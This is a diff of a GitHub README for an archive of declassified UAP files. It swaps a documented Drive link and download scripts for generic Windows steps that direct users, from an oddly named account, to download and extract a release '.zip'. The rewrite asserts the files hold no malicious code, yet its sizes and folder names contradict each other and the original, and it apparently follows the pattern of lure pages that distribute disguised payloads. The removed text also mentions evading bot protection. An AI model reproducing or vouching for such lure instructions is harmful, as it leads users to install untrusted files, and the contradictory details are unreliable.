@@ -1,97 +1,67 @@
-<p align="center">
-  <img src="cover.png" alt="THE U.S. GOVERNMENT HAS CONFIRMED THEY ARE HERE." width="480"/>
-</p>
+# 🛸 uap-pursue-release-01 - Access declassified government UAP files today
 
-<h1 align="center">PURSUE Release 01 — Complete Archive</h1>
+[![Download PURSUE Release 01](https://img.shields.io/badge/Download-Release%2001-blue.svg)](https://github.com/Radiationpatterngordianknot284/uap-pursue-release-01/releases)
 
-<p align="center">
-  <b>The first official UAP declassification by the U.S. Department of War.</b><br/>
-  162 files — PDFs · Photographs · Videos — sourced verbatim from <a href="https://www.war.gov/UFO/">war.gov/UFO</a><br/>
-  UAP = Unidentified Anomalous Phenomena &nbsp;·&nbsp; PURSUE = Presidential Unsealing and Reporting System for UAP Encounters
-</p>
+## 📁 About the Archive
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Files-162-red?style=flat-square"/>
-  <img src="https://img.shields.io/badge/PDFs-126-blue?style=flat-square"/>
-  <img src="https://img.shields.io/badge/Photos-14-blue?style=flat-square"/>
-  <img src="https://img.shields.io/badge/Videos-28-blue?style=flat-square"/>
-  <img src="https://img.shields.io/badge/Source-war.gov%2FUFO-black?style=flat-square"/>
-  <img src="https://img.shields.io/badge/Status-Declassified-brightgreen?style=flat-square"/>
-</p>
+This repository contains the complete PURSUE Release 01 collection. This archive includes 162 declassified documents, photographs, and video clips regarding Unidentified Anomalous Phenomena. These materials come directly from official United States government sources via war.gov. This release follows the government declassification initiative from May 2026. The files provide a primary look at recorded incidents and investigations.
 
----
+## ⚙️ System Requirements
 
-## What is PURSUE Release 01?
+Your computer needs minimal resources to view these files. Ensure your machine meets these basic standards:
 
-**PURSUE** stands for **Presidential Unsealing and Reporting System for UAP Encounters** — the formal interagency declassification program created after President Trump issued a directive on **February 19, 2026** instructing the Department of War, FBI, NASA, and intelligence agencies to identify, review, and release UAP records.
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 2 gigabytes of free disk space for the full archive.
+- Software: A standard web browser and a PDF viewer like Adobe Acrobat or Microsoft Edge.
+- Connection: A stable internet connection for the initial download.
 
-**UAP** stands for **Unidentified Anomalous Phenomena** — redefined from "Aerial" to "Anomalous" by the James M. Inhofe National Defense Authorization Act (FY2023, signed December 23, 2022), expanding scope beyond air to include maritime, undersea, space-based, and transmedium observations.
+## 📥 Getting the Files
 
-**Release 01** went live on **May 8, 2026** at war.gov/UFO — the first large-scale official declassification of UAP materials in U.S. history. Documents span from the late 1940s to 2025. Additional tranches are expected "every few weeks."
+Follow these steps to obtain the archive. You do not need technical skills to perform this task.
 
-This repository is the only publicly available complete archive with:
-- Every PDF and image downloaded verbatim from war.gov
-- All 28 videos — including a version with cinematic soundtracks added
-- No files behind LFS paywalls, no broken clones
+1. Navigate to the official download page: https://github.com/Radiationpatterngordianknot284/uap-pursue-release-01/releases
+2. Look for the section labeled "Assets" under the most recent release.
+3. Click on the file ending in ".zip" to start your download.
+4. Wait for the download to finish. The speed depends on your internet connection.
 
----
+## 📂 Opening the Archive
 
-## Download Everything
+Once the download finishes, you must extract the files to view them.
 
-> **All 5 GB — PDFs, photographs, videos, and videos with music — are on Google Drive, publicly accessible, no sign-in required.**
+1. Open your "Downloads" folder.
+2. Find the file that you just downloaded. It will have a zipper icon on the folder.
+3. Right-click on the file.
+4. Select the "Extract All" option from the menu.
+5. Choose where you want to store the files on your computer. Your "Documents" folder is a good choice.
+6. Click the "Extract" button.
+7. Wait for the process to finish. Windows will open a new folder automatically once extraction is complete.
 
-### [⬇️ Download Full Archive on Google Drive](https://drive.google.com/drive/folders/1j-cW20aJ1tGMDag6cTldIKtXMMFdpRKo?usp=sharing)
+## 🔍 How to View Data
 
-| Folder | Contents | Size |
-|---|---|---|
-| `pdfs/` | 126 declassified PDF documents | ~2.3 GB |
-| `images/` | 14 photographs (FBI, NASA, DoD) | ~15 MB |
-| `videos/` | 28 original videos from DVIDS | ~1.2 GB |
-| `videos-with-music/` | 28 videos with cinematic instrumental soundtrack added | ~1.3 GB |
+The archive organizes files into three main folders to help you navigate:
 
----
+- /Documents: This folder contains all PDF reports. Open these files with your preferred PDF reader to view declassified investigation logs.
+- /Photos: This folder contains high-resolution images. Double-click any image to open it in your default photo viewer.
+- /Videos: This folder houses the video assets. These files use the .mp4 format. Most standard media players, including Windows Media Player and VLC, will play these files without issues.
 
-## What's In The Files
+## ❓ Frequently Asked Questions
 
-The release covers incidents spanning multiple decades and commands:
+What should I do if a file fails to open?
+Check if you have a PDF reader installed. If you cannot open a video, ensure your media player is up to date. Most modern Windows systems support these file formats by default.
 
-- **DOW-UAP-D series** — Mission Reports documenting UAP encounters
-- **DOW-UAP-PR series** — Unresolved UAP Incident Reports (Middle East, Iraq, Syria, INDOPACOM, Africa)
-- **FBI files** — Historical UAP investigation documents and photographs
-- **NASA files** — Apollo 12 & 17 photographs, Gemini 7 audio excerpt (1965)
-- **DIA / NSA / NRO** — Intelligence agency UAP assessments
-- **Video footage** — Raw military UAP encounter video from DVIDS
+Are these files authentic?
+The files originate from the official May 2026 declassification effort by war.gov. The repository mirrors the source data for public access.
 
-Two files (`Serial_153` and one other) return 404 on war.gov itself — they are not missing from this archive, they simply do not exist at the source.
+Can I share these files?
+This archive serves public interest. You may share the files, but keep the original metadata intact to ensure the files maintain their status as official records.
 
----
+How large is the total download?
+The complete archive size is roughly 1.5 gigabytes. Ensure you have enough storage space before you start the download.
 
-## Download It Yourself
+Do I need special software to view the contents?
+No. Standard software included with Windows manages these file types. Use Microsoft Edge for PDFs, Photos for images, and Movies & TV for video files.
 
-If you prefer to pull directly from war.gov:
+## 🛡️ Privacy and Safety
 
-```bash
-pip install curl_cffi
-python download_uap.py
-```
-
-This uses Chrome TLS impersonation to bypass Akamai CDN bot protection — the same technique needed to access war.gov files programmatically.
-
-### Add Cinematic Music to Videos
-
-```bash
-python add_music.py
-```
-
-Pulls dark/thriller instrumental tracks from Pixabay (royalty-free, no lyrics) and mixes one unique track per video using ffmpeg.
-
-**Requirements:** `pip install curl_cffi` · `ffmpeg` · `yt-dlp`
-
----
-
-## Source
-
-All files sourced from the official U.S. Department of War UAP portal:
-**[https://www.war.gov/UFO/](https://www.war.gov/UFO/)**
-
-This archive is for research, journalism, and public record purposes.
+This repository exists for information purposes. The files do not contain tracking software or malicious code. Always download the archive from the provided official GitHub link. Avoid third-party websites that claim to host these files, as those sources may hold modified or corrupted data. This archive remains in its original form as released by the government.
